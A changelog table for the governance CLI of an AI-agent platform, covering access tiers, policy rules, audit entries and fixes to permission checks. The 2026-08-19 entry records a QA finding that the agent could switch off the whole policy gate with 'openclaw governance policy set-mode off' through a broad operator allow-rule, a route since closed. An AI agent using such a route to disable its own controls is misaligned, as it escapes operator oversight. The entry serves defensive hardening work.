| 2026-09-02 | Added `governance policy set-user-ask <username> <mode>` (Root) — the per-**account** half of §1.6's escalation axis, which had the route and the dashboard and no command since the axis was built (finding 222). Its per-_agent_ twin `set-agent-ask` shipped 2026-08-11 under the note "CLI parity closed… No known CLI gaps remain against the dashboard", which this makes true again. **§2d was wrong** (finding 223): it named one dashboard-only capability, asserted "the reasons are here", and missed two — this one, which had no reason, and releasing an unsent attachment, whose reason was recorded in the module instead                                                                                                                                                                                                                                   |
| 2026-09-02 | **Behaviour change, no new flags:** `agent transcript` now makes the same four checks its HTTP route makes — the User floor, an organisation, `canManageAgent`, and the agent being registered in the caller's own organisation. It had made two (signed in, and holding a group), so a **Viewer** could read a transcript from the terminal that the dashboard refuses their tier, and a User could read one for an agent nobody assigned them. Finding 216, and the fifth instance of a check present on the route and absent on the command. Two documentation corrections landed with it (finding 219): this reference said the command shows "the `cli` thread — not what a User has said … from the dashboard", which **T5 made false** when it moved conversations from the machine to the account, and the command's own `--help` line carried the same stale model |
| 2026-09-02 | No command changed. `governance backend set-codex` now writes **two** ledger entries rather than one — `governance.backend.codex-request` before the configuration write and `governance.backend.codex` after it succeeds. The single entry was written before the attempt (correct, so a change that dies half-way still shows who asked) and phrased as the accomplished change, so a failed toggle left the tamper-evident trail asserting this installation had begun accepting the Codex enforcement gap. Finding 217                                                                                                                                                                                                                                                                                                                                                  |
| 2026-08-31 | Added `governance agents access`, `governance agent runs` and `governance agent cancel` (T34), closing three of the four surface gaps finding 158 measured — and added **§2d**, which names the two that stay dashboard-only and why. The project's rule changed with it: from "a capability reaching only two surfaces is unfinished" to "every capability reaches all three unless a stated reason says otherwise"                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| 2026-08-31 | Added `governance policy grant-folder <folder> [--except <path...>]` (T32) — allowing a folder and forbidding named paths inside it as one act, on all three surfaces at once. Additive: `add-rule` is unchanged, and everything the new command writes is an ordinary, separately removable rule                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 2026-08-31 | Added `governance backend status` and `governance backend set-codex <on\|off>` (Root), completing the third surface for the machine-level half of the two-layer Codex control — the dashboard panel and the `backend/codex` route shipped on 2026-08-30 and the CLI did not, leaving the switch reachable from two surfaces while its per-agent counterpart reached three. Documented `governance agents set-codex` at the same time, which had shipped on 2026-08-30 and was never entered here. `agents list` now prints each agent's `engine:` permission, because `set-codex` changes it from this surface and a setting an operator can change but cannot read back is one they have to take on trust. §3.5.62                                                                                                                                                         |
| 2026-08-30 | No command changed. **Two corrections**, both of the same shape: this document twice explained a real behaviour by an absent CLI login, which T5 added on 2026-08-24. `agent prompt` records the signed-in account, not `cli`; `deployment` requires a login, and the asymmetry it does have — any signed-in tier may read what the dashboard shows only to Root — is now stated as itself                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 2026-08-25 | No command changed. The tree was split by subject to get under the project's 700-line limit (T16): `register.governance.ts` 848 → 459 code lines, with the whole `policy` group moving to `register.governance.policy.ts`. Recorded here because the file a reader is pointed at changed, and because the criterion narrowed — the route modules each state one _authorization_ rule, but the policy commands span Viewer to Root by design, so what makes that file coherent is its subject. Verified by `governance --help` and `governance policy --help` listing every subcommand, not only by the type checker.                                                                                                                                                                                                                                                        |
| 2026-08-24 | Added the `governance agents` command group (M4) — `list`, `register`, `rename`, `set-owner`, `unregister` — the command line's half of the agent registry, and §2c explaining it. The commands live in `src/cli/program/register.governance.agents.ts` rather than in `register.governance.ts`, which was already 163 lines past the project's own limit before M4 (T16); the identity gate both files need moved to `governance-cli-gate.ts`. The registry also changes a command that gained no flags: assigning an agent now refuses one belonging to a different Administrator, while an id that predates the registry is still accepted — the honest limit stated at the end of §2c.                                                                                                                                                                                  |
| 2026-08-24 | Added `governance groups unmigrated` and `governance groups migrate --delete` (M3), and §2b on the group model the CLI now acts inside.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| 2026-08-21 | `agent prompt` gained `--stream`, and Ctrl-C now cancels the agent run rather than only the printout. Also records the three limits that now apply to every prompt on every surface — a five-minute timeout, two concurrent prompts per account and six per installation — and states why there is no `agent cancel` command: the in-flight table is per process, so such a command could only stop a run started in the same terminal, and one that appeared to reach the Gateway's runs would be claiming a power it does not have.                                                                                                                                                                                                                                                                                                                                       |
| 2026-08-20 | Added `governance deployment` (A7) — Root's deployment and network posture report, on the CLI as well as the dashboard. The CLI form is the one that matters on a new host: the dashboard is reachable only through an SSH tunnel by design, so the moment you most need to know whether the listener is exposed is _before_ that tunnel exists. `--json` for scripts, `--strict` to exit non-zero on a failure; exit 0 by default, because a command that fails on every workstation is one people learn to ignore.                                                                                                                                                                                                                                                                                                                                                        |
| 2026-08-20 | **Behaviour change, no new flags:** `add-rule` now detects clashes **inside the write lock**. Two administrators adding the same rule at the same instant previously both saw no clash and the loser was told nothing — the duplicate was harmless, the silence was not (QA round 14).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| 2026-08-19 | **Behaviour change, no new flags:** a core denial now covers `governance <subcommand>`, so the _agent_ can no longer reach this CLI through a broad operator allow-rule such as `^(node\|npm\|npx\|pnpm) .*$`. Until QA round 13 (finding 73) `openclaw governance policy set-mode off` was a one-command bypass of the entire RBAC model. This stops the agent; it does nothing about a person with shell access, which remains A6 and is why a CLI login is still open work.                                                                                                                                                                                                                                                                                                                                                                                              |
| 2026-08-19 | `add-rule` gained `--effect allow\|deny` and `--access read\|write`. Both were enforced by the engine since the tier model landed and creatable from no interface, so an operator's own restriction meant hand-editing `policy.json` — the R5 pattern (a mechanism that works, no surface that reaches it). `--access` is **refused** on command and network rules rather than ignored, and the warnings now flip with the rule's direction: a catch-all denial is reported as disabling the agent, not as granting everything.                                                                                                                                                                                                                                                                                                                                             |
| 2026-08-17 | Added `agent prompt` and `agent transcript` — the User tier's own capability from §1.6 ("may strictly prompt the agents for task execution"), and the last of that tier's capabilities to exist. The run goes through OpenClaw's ordinary ingress, so the policy gate still sees every tool call; a locked-down agent refuses the prompt outright; conversations are kept per (agent, account). CLI prompts carry the existing `cli` attribution caveat.                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 2026-08-16 | Added `policy set-agent-mode`, the per-agent posture control. Monitor mode had been demoted to a per-agent opt-in when the tier model landed, and nothing on any of the three surfaces could actually set it — the store function was reachable only from tests. The API route, this command, and the dashboard's **Observe one agent** control landed together, all three refusing `off` for the reason documented above. Also records that `add-rule` now distinguishes a clash caused by a deny rule from one caused by an earlier allowance, because the two mean opposite things.                                                                                                                                                                                                                                                                                      |
| 2026-08-11 | CLI parity closed. Added `policy set-agent-ask`, `policy set-hitl-timeout`, `sessions`, `pending list`, `pending decide`, and an `--agent` option on `add-rule`. `add-rule` now also rejects backtracking-prone patterns and reports conflicts with earlier rules. No known CLI gaps remain against the dashboard.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| 2026-08-10 | First version. Documents `policy show/set-mode/set-ask/add-rule/remove-rule`, `audit tail/verify`, `kill [--release]`. Records that `kill` now measures and prints elapsed time and reports in-flight termination availability honestly, and that `--agent` scoping is dashboard-only so far.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
